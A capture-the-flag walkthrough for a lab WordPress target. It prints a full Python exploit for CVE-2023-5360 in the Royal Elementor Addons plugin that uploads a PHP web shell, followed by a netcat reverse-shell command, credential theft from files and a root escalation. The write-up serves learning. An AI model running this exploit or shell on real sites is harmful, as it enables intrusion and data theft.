![8c3bfef1774b4ca3b9c9ecdce58fb5a1](https://github.com/user-attachments/assets/a725c711-bbd3-403a-af94-bc7aabb9a04d)

To access the target domain locally, I edited the `/etc/hosts` file and mapped the domain name to the target IP address.

```bash
sudo nano /etc/hosts
```

I added the following line:

```text
 172.20.14.182 gridloy.hv
```

After saving the file, the website was accessible at:

```
http://gridloy.hv
```
### Content Review

When visiting the website, I observed a minimalistic blog layout. While browsing several posts, I noticed that the author consistently used the pseudonym **"Currol"**.

<img width="1913" height="873" alt="cevap 1" src="https://github.com/user-attachments/assets/d39b33b3-e52c-4ac2-b126-802f60447ae0" />


✅ **Answer 1:** The author's pseudonym is **Currol**.

---

###  Full WPScan Analysis

To identify WordPress components and vulnerabilities, I ran WPScan with aggressive detection enabled.

```bash
wpscan --url http://gridloy.hv \
  --enumerate u,p,t,tt,cb,dbe \
  --plugins-detection aggressive \
  --api-token "xxxxxxxxxx"
```

<img width="825" height="758" alt="cevap 2" src="https://github.com/user-attachments/assets/c62b6a21-f49d-4e34-9672-8b53b3e37cf0" />

### Key Findings

* **WordPress Version:** 6.4.2 (outdated)
* **Active Theme:** Minimal Blogger
* **Identified User:** admin
* **Vulnerable Plugin:** Royal Elementor Addons v1.3.78
* **Critical CVE:** CVE-2023-5360 (Unauthenticated File Upload)

---

### CVE-2023-5360

The vulnerability exists due to missing nonce validation in the `wpr_addons_upload_file` AJAX endpoint. This allows unauthenticated users to upload arbitrary files, including PHP web shells.
Based on the WPScan results, I identified **CVE-2023-5360**, an unauthenticated file upload vulnerability affecting the *Royal Elementor Addons* plugin.  

First, I created the exploit script file:

```bash
nano exploit.py
```

```python
#!/usr/bin/env python3
import requests, re, json, sys

def get_nonce(target):
    r = requests.get(target, verify=False)
    m = re.search(r'var\s+WprConfig\s*=\s*({.*?});', r.text)
    return json.loads(m.group(1)).get("nonce") if m else None

def upload_shell(target, nonce):
    ajax = target.rstrip('/') + '/wp-admin/admin-ajax.php'
    files = {"uploaded_file": ("shell.php", b'<?php system($_GET["cmd"]); ?>')}
    data = {
        "action": "wpr_addons_upload_file",
        "wpr_addons_nonce": nonce
    }
    r = requests.post(ajax, data=data, files=files, verify=False)
    return json.loads(r.text)["data"]["url"] if r.status_code == 200 else None

# Ana işlem
target = "http://gridloy.hv"
print("[*] Nonce değeri alınıyor...")
nonce = get_nonce(target)

if not nonce:
    print("[-] Nonce bulunamadı!")
    sys.exit(1)

print(f"[+] Nonce bulundu: {nonce}")
print("[*] Web shell yükleniyor...")

shell_url = upload_shell(target, nonce)

if shell_url:
    print(f"[+] Web shell başarıyla yüklendi!")
    print(f"[+] Shell URL: {shell_url}")
    print(f"\n[+] Test komutu:")
    print(f"curl -s \"{shell_url}?cmd=id\"")
else:
    print("[-] Shell yükleme başarısız!")
```

I then pasted the exploit code into the file and saved it (`Ctrl + X`, `Y`, `Enter`).

### Exploit Script Execution

After preparing the script, I executed it to trigger the vulnerability:

```bash
python3 exploit.py
```

The script successfully retrieved the nonce value and uploaded the PHP web shell.  
The output confirmed a successful exploitation:

```text
[*] Retrieving nonce value...
[+] Nonce found: abc123def456ghi789
[*] Uploading web shell...
[+] Web shell uploaded successfully!
[+] Shell URL: http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php
```

The script also provided a test command to verify command execution:

```bash
curl -s "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php?cmd=id"
```
<img width="822" height="190" alt="cevap 3" src="https://github.com/user-attachments/assets/236351b7-a5f8-4ee5-81f5-4813bf5f904a" />

### Listener

```bash
nc -lvnp 4444
```

### Reverse Shell Trigger

```bash
curl "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php?cmd=nc -e /bin/sh "ip" 4444"
```

<img width="517" height="258" alt="cevap 4" src="https://github.com/user-attachments/assets/94fdba58-93c5-4eea-b185-fa1bfbfc137c" />

---


### Filesystem Enumeration

While navigating through the WordPress installation directory, I inspected the following path:

```bash
cd /var/www/html/wordpress
ls -la
```
During this process, I noticed a suspicious file named **`my_passwords.txt`**, which appeared to contain sensitive information.

To inspect the contents of the file, I used the `cat` command:

```bash
cat /var/www/html/wordpress/my_passwords.txt
```

<img width="432" height="269" alt="cevap 5" src="https://github.com/user-attachments/assets/06eb69e2-3ee1-4c7f-be4a-05b71eedb264" />

✅ **Answer 2:** WordPress password is **b2tGAIvRDpJpNit6q2**

---

##  WordPress Admin Login

```text
URL: http://gridloy.hv/wp-login.php
Username: admin
Password: b2tGAIvRDpJpNit6q2
```

Once logged in, I navigated to the Comments section from the left-side admin menu.
By scrolling down to the lower section of the page, I identified a comment marked as Pending, indicating that it had not yet been published.

<img width="1919" height="704" alt="cevap 6" src="https://github.com/user-attachments/assets/4307ba60-8e01-4612-b979-7124b370ba99" />

The unpublished comment revealed the author’s name, which directly answered the third challenge question.

✅ **Answer 3:** Unpublished comment author is **Judson Braun**

---

After discovering the root username and password on the system, I attempted to escalate privileges in order to gain full control of the target machine.
Using the previously obtained credentials, I tried to switch to the root user:

```bash
su root
```

At this stage, the system did not prompt for a password and the shell remained limited.  
This behavior indicated that I was still restricted to the **www-data** reverse shell environment and did not yet have a fully interactive TTY.
To resolve this limitation, I upgraded the reverse shell to a fully interactive TTY using Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
After spawning a proper TTY, shell interaction became stable and privilege escalation attempts could be retried reliably.
With the upgraded shell in place, I attempted privilege escalation once again:

```bash
su root
password: aceRyanDI
```

This time, the operation succeeded and I gained full **root** access on the system.
After obtaining root privileges, I performed final system enumeration.  
While inspecting the `/root` directory, I discovered a file containing sensitive site ownership information:

```bash
cat /root/site_owner_informations.txt
```

<img width="769" height="340" alt="cevap 7" src="https://github.com/user-attachments/assets/db03bc0e-a735-4585-911d-e33633301569" />

The file revealed the answer to the final challenge question.

✅ **Final Answer:** The real name of the author using the pseudonym **Currol** is **Beth Ryan**.

------

Thank you for taking the time to read this write-up.

I hope this guide clearly and effectively demonstrated the full CTF process.  
If it helped you learn something new or added value in any way, I would be very happy.

Good luck, and see you in the next CTF.
